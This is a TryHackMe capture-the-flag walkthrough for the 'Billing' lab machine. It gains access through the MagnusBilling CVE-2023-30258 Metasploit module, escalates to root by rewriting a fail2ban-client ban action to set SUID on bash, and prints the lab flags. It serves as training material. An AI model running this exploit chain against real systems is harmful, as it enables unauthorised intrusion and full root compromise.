# Billing - TryHackMe Walkthrough

Today we have another TryHackMe challenge named **Billing**, an easy-rated Linux machine. The goal is to enumerate the target, gain initial access, and finally obtain root privileges.

## Target Information

```text
IP Address: 10.49.153.92
```

---

# Initial Enumeration

As always, the first step is to identify open ports.

```bash
nmap 10.49.153.92 -p-
```

### Results

```text
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
5038/tcp open  unknown
```

Interesting services discovered:

* SSH
* HTTP
* MySQL
* Asterisk

---

# Service Enumeration

Next, I performed a service and version detection scan.

```bash
nmap -sC -sV 10.49.153.92
```

### Results

```text
22/tcp   OpenSSH 9.2p1 Debian
80/tcp   Apache httpd 2.4.62
3306/tcp MariaDB 10.3.23 or earlier
5038/tcp Asterisk Call Manager 2.10.6
```

The web application immediately stood out.

```text
MagnusBilling
```

The robots file also revealed:

```text
/mbilling/
```

which redirected directly into the application.

---

# Web Enumeration

Browsing the application confirmed that the target was running MagnusBilling.

To enumerate additional content, I used directory brute forcing.

```bash
feroxbuster -u http://10.49.153.92/mbilling/
```

### Interesting Findings

```text
/mbilling/tmp/
/mbilling/lib/
/mbilling/assets/
/mbilling/lib/GoogleAuthenticator/
/mbilling/lib/PlacetoPay/
/mbilling/lib/anet/
/mbilling/lib/stripe/
/mbilling/lib/gerencianet/
```

Most of these directories only exposed application resources and libraries.

After manually reviewing the application and researching MagnusBilling, I found references to a known vulnerability affecting the software.

---

# Initial Access

The application version was vulnerable to:

```text
CVE-2023-30258
```

I used the available Metasploit module.

```bash
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
```

Configure the target:

```bash
set RHOST 10.49.153.92
```

Execute:

```bash
exploit
```

### Results

```text
The target is vulnerable.
Successfully tested command injection.

Meterpreter session opened.
```

Initial access was obtained successfully.

---

# Shell Access

After obtaining a Meterpreter session, I upgraded to a shell.

```bash
shell
```

A normal Linux shell was obtained.

To improve shell interaction:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then stabilized the shell using:

```bash
stty raw -echo
export TERM=xterm
```

The shell was now fully interactive.

Current user:

```text
asterisk
```

---

# User Flag

While enumerating the filesystem, I discovered the home directory belonging to the user:

```text
magnus
```

Reading the user flag:

```bash
cat /home/magnus/user.txt
```

### User Flag

```text
THM{4a6831d5f124b25eefb1e92e0f0da4ca}
```

User access achieved.

---

# Privilege Escalation Enumeration

The next step was checking sudo permissions.

```bash
sudo -l
```

### Output

```text
User asterisk may run the following commands:

(ALL) NOPASSWD: /usr/bin/fail2ban-client
```

Interesting.

The Fail2Ban client can be executed as root without a password.

---

# Fail2Ban Analysis

First, I inspected the available actions.

```bash
sudo /usr/bin/fail2ban-client get asterisk-iptables actions
```

Output:

```text
iptables-allports-ASTERISK
```

Checking the configured action:

```bash
sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
```

Output:

```text
<iptables> -I f2b-ASTERISK 1 -s <ip> -j <blocktype>
```

The action could be modified.

I changed the action configuration:

```bash
sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
```

Verifying the change:

```bash
sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
```

Output:

```text
chmod +s /bin/bash
```

The custom action was now configured.

---

# Triggering the Action

To trigger the modified Fail2Ban action:

```bash
sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4
```

After triggering, checking bash permissions:

```bash
ls -lah /bin/bash
```

Output:

```text
-rwsr-sr-x
```

The SUID bit had been applied.

---

# Root Access

Executing:

```bash
/bin/bash -p
```

Checking identity:

```bash
whoami
```

Output:

```text
root
```

Root access obtained successfully.

---

# Root Flag

Reading the root flag:

```bash
cat /root/root.txt
```

### Root Flag

```text
THM{33ad5b530e71a172648f424ec23fae60}
```

---

# Flags Collected

## User Flag

```text
THM{4a6831d5f124b25eefb1e92e0f0da4ca}
```

## Root Flag

```text
THM{33ad5b530e71a172648f424ec23fae60}
```

---

# Attack Path Summary

```text
Port Scan
      ↓
MagnusBilling Discovery
      ↓
Directory Enumeration
      ↓
Version Identification
      ↓
CVE-2023-30258
      ↓
Remote Code Execution
      ↓
Shell Access
      ↓
User Flag
      ↓
Fail2Ban Sudo Privilege
      ↓
Modified Action Configuration
      ↓
SUID Bash
      ↓
Root Access
      ↓
Root Flag
```

---

# Conclusion

This machine focused on exploiting a vulnerable MagnusBilling installation affected by CVE-2023-30258. Successful exploitation resulted in remote code execution as the `asterisk` user. After obtaining a stable shell, local enumeration revealed a misconfigured sudo permission allowing execution of `fail2ban-client` without authentication. By leveraging this configuration, it was possible to gain root privileges and complete the machine.

This room provided practice with:

* Web Enumeration
* Directory Discovery
* Vulnerability Identification
* Remote Code Execution
* Shell Stabilization
* Linux Privilege Escalation
* Fail2Ban Misconfiguration Abuse
